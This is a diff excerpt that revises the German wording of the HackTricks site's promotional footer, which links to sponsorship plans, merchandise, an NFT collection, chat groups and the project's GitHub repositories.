-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
